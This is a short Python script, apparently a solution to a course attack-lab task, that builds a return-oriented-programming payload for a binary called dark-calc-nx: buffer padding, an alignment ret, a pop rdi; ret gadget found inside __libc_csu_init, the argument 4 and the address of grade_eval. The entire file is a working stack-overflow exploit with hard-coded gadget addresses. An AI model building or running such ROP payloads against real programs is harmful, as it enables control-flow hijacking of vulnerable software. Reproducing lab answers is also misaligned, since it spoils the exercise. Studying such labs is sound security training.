#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

The stack is non-executable, so use Return-Oriented Programming.
Inside __libc_csu_init, the bytes of `pop r15` (41 5f) hide a
`pop rdi; ret` gadget at 0x401a33. Build the chain:

    pop rdi; ret -> 4 -> grade_eval
"""
import struct
import sys

POP_RDI_RET = 0x401A33
GRADE_EVAL = 0x401978
RET = 0x401A34  # bare ret, used to keep the stack 16-byte aligned

payload = b"A" * 24
payload += struct.pack("<Q", RET)           # align rsp before the call chain
payload += struct.pack("<Q", POP_RDI_RET)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", GRADE_EVAL)
payload += b"\n"

sys.stdout.buffer.write(payload)
